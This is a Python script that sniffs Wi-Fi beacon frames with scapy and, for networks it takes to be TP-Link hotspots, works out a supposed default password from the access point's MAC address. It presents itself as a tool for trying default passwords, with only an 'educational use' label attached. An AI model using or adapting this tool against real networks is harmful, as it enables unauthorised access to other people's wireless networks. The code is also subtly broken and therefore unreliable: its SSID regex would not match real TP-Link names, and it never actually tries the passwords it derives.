#!/usr/bin/env python3
from argparse import ArgumentParser
from collections import namedtuple
from re import search

from scapy.layers.dot11 import Dot11, Dot11Elt
from scapy.sendrecv import sniff

parser = ArgumentParser(description="Python script for trying default passwords for some TP-Link Hotspots",
                        epilog="FOR EDUCATIONAL USE ONLY")
parser.add_argument("-p", "--print-all",
                    help="print all found ssid's", action="store_true")
parser.add_argument("-t", "--timeout", type=int)
args = parser.parse_args()

Config = namedtuple("Config", ["timeout", "print_all"])
CONFIG = Config(timeout=args.timeout, print_all=args.print_all)

endpoints = {
    # mac_address: [ssid, password]
}


def generate_password_list():
    return [endpoints[endpoint][1] for endpoint in endpoints.keys() if endpoints[endpoint][1]]


def is_tp_link(ssid):
    return search("^tp*link$", ssid.lower())


def get_password(mac_address):
    return mac_address.replace(":", "")[-8:]


def add_endpoint(ssid, mac_address, password=None):
    endpoints[mac_address] = [ssid, password]


def print_endpoint(ssid, mac_address, channel, password=None):
    print("\nSSID: {ssid} \nMac Address: {mac_address} \nChannel: {channel}".format(
        ssid=ssid, mac_address=mac_address, channel=channel))
    if password:
        print("Default Password: {password}".format(password=password))


def packet_handler(packet):
    if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
        try:
            ssid = packet.info.decode("utf-8")
            mac_address = str(packet.addr2)
            channel = int(ord(packet[Dot11Elt:3].info))
            if not endpoints.get(mac_address) and not ssid == "":
                if CONFIG.print_all:
                    print_endpoint(ssid, mac_address, channel)
                if is_tp_link(ssid):
                    password = get_password(mac_address)
                    print_endpoint(ssid, mac_address,
                                   channel, password=password)
                    add_endpoint(ssid, mac_address, password=password)
                else:
                    add_endpoint(ssid, mac_address)
        except (UnicodeDecodeError, AttributeError, TypeError, IndexError, AttributeError):
            pass


def main():
    try:
        if CONFIG.timeout:
            print("Scanning for {timeout} sec...".format(
                timeout=CONFIG.timeout))
        else:
            print("Scanning...")
        sniff(prn=packet_handler, store=False,
              monitor=True, timeout=CONFIG.timeout)
        print("Finishing up...\n")
        print("Found {len_endpoints} endpoints".format(
            len_endpoints=len(endpoints)))
        print("Found {count_passwords} passwords".format(
            count_passwords=len(generate_password_list())))
        # print(repr(endpoints))
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)


if __name__ == "__main__":
    main()
